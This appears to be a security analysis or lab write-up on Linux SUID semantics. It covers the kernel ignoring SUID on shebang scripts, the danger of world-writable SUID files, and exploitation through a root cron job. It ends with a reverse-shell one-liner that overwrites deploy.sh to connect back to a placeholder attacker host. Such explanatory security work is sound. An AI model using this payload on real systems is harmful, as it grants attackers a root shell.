# Deep SUID Structural Analysis

### 1. Kernel-Level Treatment of Interpreted Scripts
Modern Linux kernels ignore the SUID bit on interpreted scripts (those starting with a shebang `#!`) to mitigate a well-known race condition. 

When an interpreted script is executed, the kernel opens the file to read the shebang path and then invokes the specified interpreter (e.g., `/bin/bash`), passing the script path as an argument. Between the time the kernel checks the file permissions and the time the interpreter opens the file to read its code, an attacker can substitute the script file with a malicious link (a symlink race attack). To eliminate this vulnerability, the kernel evaluates shebang scripts using the actual user's privileges, ignoring the SUID bit entirely.

### 2. Why SUID + World-Writable is Critical
Even though the kernel blocks the direct execution of shell scripts with SUID permissions, the combination of a SUID bit and a world-writable state (`-rwsr-xrwx`) remains a catastrophic security finding. 

This file state signals structural intent to the system administration ecosystem. Tools, configuration scripts, and background automated deployment workflows often query system metadata using permissions configurations. More importantly, because the script was world-writable, any unprivileged user could replace its contents, altering the operations of any high-privilege process that interacts with it.

### 3. Exploitation in Practice
This scenario is directly exploitable because the script is executed by a **root-owned cron job**. 

While the SUID bit itself is ignored by the kernel when an unprivileged user triggers the script, the file's world-writable permission (`777`) allows an attacker to clear out the deployment file and replace it with a reverse shell payload:

```bash
echo "bash -i >& /dev/tcp/attacker-ip/4444 0>&1" > /opt/kijanikiosk/scripts/deploy.sh
